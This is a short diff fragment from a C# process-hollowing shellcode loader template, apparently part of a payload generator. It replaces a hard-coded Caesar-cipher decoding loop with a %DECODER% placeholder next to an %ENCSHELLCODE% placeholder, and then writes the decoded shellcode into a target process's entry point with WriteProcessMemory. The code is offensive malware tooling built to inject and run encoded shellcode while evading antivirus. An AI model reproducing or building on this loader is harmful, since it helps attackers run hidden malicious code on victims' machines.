@@ -98,10 +98,12 @@ namespace Hollowing
 			%ENCSHELLCODE%
         
             //Decoding shellcode with Cesar Cipher
-            for(int i = 0; i < buf.Length; i++)
-            {
-                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
-            }
+            //for(int i = 0; i < buf.Length; i++)
+            //{
+            //    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+            //}
+
+			%DECODER%
 			
 			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
 
